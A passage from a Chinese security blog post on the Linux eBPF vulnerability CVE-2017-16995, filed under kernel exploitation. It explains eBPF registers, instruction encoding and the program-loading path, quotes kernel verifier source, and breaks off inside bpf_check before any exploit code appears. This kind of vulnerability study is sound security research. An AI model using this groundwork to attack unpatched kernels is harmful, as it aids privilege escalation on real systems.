<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="196082">
    
    <title>
        
            CVE-2017-16995 |
        
        196082&#39;s blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="shortcut icon" href="/images/ufo.ico">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/css/font-awesome.min.css">
    <script id="hexo-configurations">
    let KEEP = window.KEEP || {};
    KEEP.hexo_config = {"hostname":"cv196082.gitee.io","root":"/","language":"zh-CN","path":"search.json"};
    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/ai.jpg","favicon":"/images/ufo.ico","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"mac"},"pjax":{"enable":false},"lazyload":{"enable":true},"version":"3.4.3"};
    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 月前","year":"%s 年前"};
  </script>
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="196082's blog" type="application/atom+xml">
</head>


<body>
<div class="progress-bar-container">
    

    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            <header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            
            <a class="logo-title" href="/">
                196082&#39;s blog
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                首页
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                归档
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/categories"
                            >
                                分类
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/links"
                            >
                                友链
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">首页</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">归档</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/categories">分类</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/links">友链</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="article-content-container">

        <div class="article-title">
            <span class="title-hover-animation">CVE-2017-16995</span>
        </div>

        
            <div class="article-header">
                <div class="avatar">
                    <img src="/images/ai.jpg">
                </div>
                <div class="info">
                    <div class="author">
                        <span class="name">196082</span>
                        
                            <span class="author-label">切勿浮躁,绝不摆烂!</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fas fa-edit"></i>&nbsp;2022-10-10 17:07:38
    </span>
    
        <span class="article-categories article-meta-item">
            <i class="fas fa-folder"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/categories/kernel-pwn/">kernel-pwn</a>&nbsp;
                    </li>
                
                    <li>
                        &gt; <a href="/categories/kernel-pwn/CVE/">CVE</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fas fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/ebpf/">ebpf</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fas fa-file-word"></i>&nbsp;<span>6.1k 字</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fas fa-clock"></i>&nbsp;<span>32 分钟</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        <div class="article-content markdown-body">
            <p>这一篇是作为ebpf的入门文章，所以会稍微介绍一下指令集，寄存器。可能篇幅略长。</p>
<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>该漏洞最早是由17年12月21号Google Project Zero团队的Jann Horn发现并报告的，编号为CVE-2017-16995。<br><strong>内核影响版本：</strong>Linux Kernel Version 4.14 ~ 4.4 。</p>
<h2 id="eBPF指令集介绍"><a href="#eBPF指令集介绍" class="headerlink" title="eBPF指令集介绍"></a>eBPF指令集介绍</h2><p>在认识一个新的指令集的第一步就是认识寄存器，在eBPF中存在十一个寄存器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">R0：一般用来表示函数返回值，包括整个 BPF 代码块（其实也可被看做一个函数）的返回值；</span><br><span class="line">R1~R5：一般用于表示内核预设函数的参数；</span><br><span class="line">R6~R9：在 BPF 代码中可以作存储用，其值不受内核预设函数影响；</span><br><span class="line">R10：只读，用作栈指针(SP)</span><br><span class="line">可理解对应为物理寄存器为：</span><br><span class="line">		R0 – rax</span><br><span class="line">    R1 - rdi</span><br><span class="line">    R2 - rsi</span><br><span class="line">    R3 - rdx</span><br><span class="line">    R4 - rcx</span><br><span class="line">    R5 - r8</span><br><span class="line">    R6 - rbx</span><br><span class="line">    R7 - r13</span><br><span class="line">    R8 - r14</span><br><span class="line">    R9 - r15</span><br><span class="line">    R10 – rbp</span><br></pre></td></tr></table></figure>

<p>对于算数(ALU)和跳转(JMP)指令，8bit的代码字段分为三个部分：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+----------------+--------+--------------------+</span><br><span class="line">|   4 bits       |  1 bit |   3 bits           |</span><br><span class="line">| operation code | source | instruction class  |</span><br><span class="line">+----------------+--------+--------------------+</span><br><span class="line">(MSB)                                      (LSB)</span><br></pre></td></tr></table></figure>

<p>这里最后3bit LSB代表指令类型：    </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">eBPF classes:</span><br><span class="line"></span><br><span class="line"> BPF_LD    <span class="number">0x00</span></span><br><span class="line"> BPF_LDX   <span class="number">0x01</span></span><br><span class="line"> BPF_ST    <span class="number">0x02</span></span><br><span class="line"> BPF_STX   <span class="number">0x03</span></span><br><span class="line"> BPF_ALU   <span class="number">0x04</span></span><br><span class="line"> BPF_JMP   <span class="number">0x05</span></span><br><span class="line"> BPF_JMP32 <span class="number">0x06</span></span><br><span class="line"> BPF_ALU64 <span class="number">0x07</span></span><br></pre></td></tr></table></figure>

<p>当<code>BPF_CLASS(code) == BPF_ALU or BPF_JMP</code>时,第四bit编码源操作数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BPF_K     <span class="number">0x00</span> ；代表将立即数作为源操作数</span><br><span class="line">BPF_X     <span class="number">0x08</span> ；代表将‘src_reg’作为源操作数</span><br></pre></td></tr></table></figure>

<p>前4bit的MSB用来存储操作码：</p>
<ol>
<li>如果 BPF_CLASS(code) == BPF_ALU or BPF_ALU64时，操作码会是下面的一个：</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">BPF_ADD   <span class="number">0x00</span></span><br><span class="line">BPF_SUB   <span class="number">0x10</span></span><br><span class="line">BPF_MUL   <span class="number">0x20</span></span><br><span class="line">BPF_DIV   <span class="number">0x30</span></span><br><span class="line">BPF_OR    <span class="number">0x40</span></span><br><span class="line">BPF_AND   <span class="number">0x50</span></span><br><span class="line">BPF_LSH   <span class="number">0x60</span></span><br><span class="line">BPF_RSH   <span class="number">0x70</span></span><br><span class="line">BPF_NEG   <span class="number">0x80</span></span><br><span class="line">BPF_MOD   <span class="number">0x90</span></span><br><span class="line">BPF_XOR   <span class="number">0xa0</span></span><br><span class="line">BPF_MOV   <span class="number">0xb0</span>  <span class="comment">/* eBPF only: mov reg to reg */</span></span><br><span class="line">BPF_ARSH  <span class="number">0xc0</span>  <span class="comment">/* eBPF only: sign extending shift right */</span></span><br><span class="line">BPF_END   <span class="number">0xd0</span>  <span class="comment">/* eBPF only: endianness conversion */</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>如果BPF_CLASS(code) == BPF_JMP or BPF_JMP32时，操作码将会是下面的一个：</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">BPF_JA    <span class="number">0x00</span>  <span class="comment">/* BPF_JMP only */</span></span><br><span class="line">BPF_JEQ   <span class="number">0x10</span></span><br><span class="line">BPF_JGT   <span class="number">0x20</span></span><br><span class="line">BPF_JGE   <span class="number">0x30</span></span><br><span class="line">BPF_JSET  <span class="number">0x40</span></span><br><span class="line">BPF_JNE   <span class="number">0x50</span>  <span class="comment">/* eBPF only: jump != */</span></span><br><span class="line">BPF_JSGT  <span class="number">0x60</span>  <span class="comment">/* eBPF only: signed &#x27;&gt;&#x27; */</span></span><br><span class="line">BPF_JSGE  <span class="number">0x70</span>  <span class="comment">/* eBPF only: signed &#x27;&gt;=&#x27; */</span></span><br><span class="line">BPF_CALL  <span class="number">0x80</span>  <span class="comment">/* eBPF BPF_JMP only: function call */</span></span><br><span class="line">BPF_EXIT  <span class="number">0x90</span>  <span class="comment">/* eBPF BPF_JMP only: function return */</span></span><br><span class="line">BPF_JLT   <span class="number">0xa0</span>  <span class="comment">/* eBPF only: unsigned &#x27;&lt;&#x27; */</span></span><br><span class="line">BPF_JLE   <span class="number">0xb0</span>  <span class="comment">/* eBPF only: unsigned &#x27;&lt;=&#x27; */</span></span><br><span class="line">BPF_JSLT  <span class="number">0xc0</span>  <span class="comment">/* eBPF only: signed &#x27;&lt;&#x27; */</span></span><br><span class="line">BPF_JSLE  <span class="number">0xd0</span>  <span class="comment">/* eBPF only: signed &#x27;&lt;=&#x27; */</span></span><br></pre></td></tr></table></figure>

<p>比如 <code>BPF_ADD | BPF_X | BPF_ALU</code>这条指令代表32位加法运算，将源寄存器的值加上目的寄存器的值，然后将结果存储到目的寄存器中：<code>dst_reg = (u32) dst_reg + (u32) src_reg;</code></p>
<p>并且，在eBPF指令集中没有了BPF_RET指令，用<code>BPF_JMP | BPF_EXIT</code>仅代替函数执行完退出，在函数退出之前，eBPF需要将返回值存储在R0中。</p>
<p>对于加载（LOAD）和存储(STORE)指令，8-bit的代码域分为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+--------+--------+-------------------+</span><br><span class="line">| <span class="number">3</span> bits | <span class="number">2</span> bits |   <span class="number">3</span> bits          |</span><br><span class="line">|  mode  |  size  | instruction <span class="class"><span class="keyword">class</span> |</span></span><br><span class="line"><span class="class">+--------+--------+-------------------+</span></span><br><span class="line"><span class="class">(<span class="title">MSB</span>)                             (<span class="title">LSB</span>)</span></span><br></pre></td></tr></table></figure>

<p>其中size分别有下面四种类型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BPF_W   <span class="number">0x00</span>   ; word <span class="number">4</span> byte</span><br><span class="line">BPF_H   <span class="number">0x08</span>   ; half word <span class="number">2</span> byte</span><br><span class="line">BPF_B   <span class="number">0x10</span>   ; byte </span><br><span class="line">BPF_DW  <span class="number">0x18</span>   ; <span class="keyword">double</span> word <span class="number">8</span> byte</span><br></pre></td></tr></table></figure>

<p>并且在内核中，每一条指令的信息都储存在bpf_insn结构体中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> &#123;</span></span><br><span class="line">    __u8    code;       <span class="comment">/* opcode */</span></span><br><span class="line">    __u8    dst_reg:<span class="number">4</span>;  <span class="comment">/* dest register */</span></span><br><span class="line">    __u8    src_reg:<span class="number">4</span>;  <span class="comment">/* source register */</span></span><br><span class="line">    __s16   off;        <span class="comment">/* signed offset */</span></span><br><span class="line">    __s32   imm;        <span class="comment">/* signed immediate constant */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="eBPF代码加载执行流程-amp-检查分析"><a href="#eBPF代码加载执行流程-amp-检查分析" class="headerlink" title="eBPF代码加载执行流程 &amp; 检查分析"></a>eBPF代码加载执行流程 &amp; 检查分析</h2><h3 id="加载执行流程"><a href="#加载执行流程" class="headerlink" title="加载执行流程"></a>加载执行流程</h3><p>用户可以用eBPF指令字节码的形式向内核输送代码，并通过事件来（如往socket写数据）来触发内核执行用户提供的eBPF代码。eBPF模块可以让用户加载数据包过滤代码（eBPF代码）进入内核，在收到数据包时触发eBPF代码执行。可以编写一个简单的用户数据包过滤程序来触发执行eBPF代码，具体流程如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">* syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, <span class="keyword">sizeof</span>(attr)) ；创建全局变量<span class="built_in">map</span>结构体，内核态用户态都可以访问。</span><br><span class="line">* syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, <span class="keyword">sizeof</span>(attr)) ；将用户态的BPF代码注入到内核，并对代码进行检查，并模拟执行。</span><br><span class="line">    * <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_prog_load</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span> ；判断过滤模式</span></span><br><span class="line"><span class="function">        * <span class="keyword">int</span> <span class="title">bpf_check</span><span class="params">(struct bpf_prog **prog, <span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function">            * <span class="title">check_cfg</span><span class="params">(env)</span></span>; 第一轮检查，检查是否存在环路</span><br><span class="line">            * do_check(env);  第二轮检查，详细扫描BPF代码的运行过程，跟踪分析寄存器和堆栈，检查是否有不符合规则的情况出现</span><br><span class="line">    * <span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> __bpf_prog_run(<span class="keyword">void</span> *ctx, <span class="keyword">const</span> struct bpf_insn *insn)；运行BPF指令，最后真正运行的的函数。</span><br><span class="line">* setsockopt(sockets[<span class="number">1</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, <span class="keyword">sizeof</span>(progfd))；将eBPF与特定的事件绑定，在收到数据包时触发eBPF代码执行。</span><br></pre></td></tr></table></figure>

<h3 id="检查分析"><a href="#检查分析" class="headerlink" title="检查分析"></a>检查分析</h3><p>根据上述流程我们可以看到我们将BPF代码注入到内核中是发生在第二步中的，执行的函数为：<code>bpf_prog_load</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_prog_load</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">enum</span> <span class="title">bpf_prog_type</span> <span class="title">type</span> =</span> attr-&gt;prog_type;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">bpf_prog</span> *<span class="title">prog</span>;</span></span><br><span class="line">  <span class="keyword">int</span> err;</span><br><span class="line">  <span class="keyword">char</span> license[<span class="number">128</span>];</span><br><span class="line">  <span class="keyword">bool</span> is_gpl;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (CHECK_ATTR(BPF_PROG_LOAD))</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* copy eBPF program license from user space */</span></span><br><span class="line">  <span class="keyword">if</span> (strncpy_from_user(license, u64_to_ptr(attr-&gt;license),</span><br><span class="line">                        <span class="keyword">sizeof</span>(license) - <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> -EFAULT;</span><br><span class="line">  license[<span class="keyword">sizeof</span>(license) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* eBPF programs must be GPL compatible to use GPL-ed functions */</span></span><br><span class="line">  is_gpl = license_is_gpl_compatible(license);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (attr-&gt;insn_cnt &gt;= BPF_MAXINSNS)</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (type == BPF_PROG_TYPE_KPROBE &amp;&amp;</span><br><span class="line">      attr-&gt;kern_version != LINUX_VERSION_CODE)</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (type != BPF_PROG_TYPE_SOCKET_FILTER &amp;&amp; !capable(CAP_SYS_ADMIN))</span><br><span class="line">    <span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* plain bpf_prog allocation */</span></span><br><span class="line">  prog = bpf_prog_alloc(bpf_prog_size(attr-&gt;insn_cnt), GFP_USER);</span><br><span class="line">  <span class="keyword">if</span> (!prog)</span><br><span class="line">    <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">  err = bpf_prog_charge_memlock(prog);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">goto</span> free_prog_nouncharge;</span><br><span class="line"></span><br><span class="line">  prog-&gt;len = attr-&gt;insn_cnt;</span><br><span class="line"></span><br><span class="line">  err = -EFAULT;</span><br><span class="line">  <span class="keyword">if</span> (copy_from_user(prog-&gt;insns, u64_to_ptr(attr-&gt;insns),</span><br><span class="line">                     prog-&gt;len * <span class="keyword">sizeof</span>(struct bpf_insn)) != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> free_prog;</span><br><span class="line"></span><br><span class="line">  prog-&gt;orig_prog = <span class="literal">NULL</span>;</span><br><span class="line">  prog-&gt;jited = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  atomic_set(&amp;prog-&gt;aux-&gt;refcnt, <span class="number">1</span>);</span><br><span class="line">  prog-&gt;gpl_compatible = is_gpl ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* find program type: socket_filter vs tracing_filter */</span></span><br><span class="line">  err = find_prog_type(type, prog);</span><br><span class="line">  <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> free_prog;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* run eBPF verifier */</span></span><br><span class="line">  err = bpf_check(&amp;prog, attr);</span><br><span class="line">  <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> free_used_maps;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* fixup BPF_CALL-&gt;imm field */</span></span><br><span class="line">  fixup_bpf_calls(prog);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* eBPF program is ready to be JITed */</span></span><br><span class="line">  err = bpf_prog_select_runtime(prog);</span><br><span class="line">  <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> free_used_maps;</span><br><span class="line"></span><br><span class="line">  err = bpf_prog_new_fd(prog);</span><br><span class="line">  <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="comment">/* failed to allocate fd */</span></span><br><span class="line">    <span class="keyword">goto</span> free_used_maps;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  free_used_maps:</span><br><span class="line">  free_used_maps(prog-&gt;aux);</span><br><span class="line">  free_prog:</span><br><span class="line">  bpf_prog_uncharge_memlock(prog);</span><br><span class="line">  free_prog_nouncharge:</span><br><span class="line">  bpf_prog_free(prog);</span><br><span class="line">  <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到在19行对ebpf license进行验证是否为GPL证书的一种，在21行检验了传入代码的长度，然后通过<code>find_prog_type</code>函数判断过滤模式，其中socket_filter是数据包过滤，而tracing_filter就是对系统调用号及参数的过滤，也就是我们常见的seccomp。最后进入<code>bpf_check</code>函数进行进一步验证。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf_check</span><span class="params">(struct bpf_prog **prog, <span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> __user *log_ubuf = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">verifier_env</span> *<span class="title">env</span>;</span></span><br><span class="line">  <span class="keyword">int</span> ret = -EINVAL;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((*prog)-&gt;len &lt;= <span class="number">0</span> || (*prog)-&gt;len &gt; BPF_MAXINSNS)</span><br><span class="line">    <span class="keyword">return</span> -E2BIG;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* &#x27;struct verifier_env&#x27; can be global, but since it&#x27;s not small,</span></span><br><span class="line"><span class="comment">	 * allocate/free it every time bpf_check() is called</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">  env = kzalloc(<span class="keyword">sizeof</span>(struct verifier_env), GFP_KERNEL);</span><br><span class="line">  <span class="keyword">if</span> (!env)</span><br><span class="line">    <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">  env-&gt;prog = *prog;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* grab the mutex to protect few globals used by verifier */</span></span><br><span class="line">  mutex_lock(&amp;bpf_verifier_lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (attr-&gt;log_level || attr-&gt;log_buf || attr-&gt;log_size) &#123;</span><br><span class="line">    <span class="comment">/* user requested verbose verifier output</span></span><br><span class="line"><span class="comment">		 * and supplied buffer to store the verification trace</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">    log_level = attr-&gt;log_level;</span><br><span class="line">    log_ubuf = (<span class="keyword">char</span> __user *) (<span class="keyword">unsigned</span> <span class="keyword">long</span>) attr-&gt;log_buf;</span><br><span class="line">    log_size = attr-&gt;log_size;</span><br><span class="line">    log_len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    ret = -EINVAL;</span><br><span class="line">    <span class="comment">/* log_* values have to be sane */</span></span><br><span class="line">    <span class="keyword">if</span> (log_size &lt; <span class="number">128</span> || log_size &gt; UINT_MAX &gt;&gt; <span class="number">8</span> ||</span><br><span 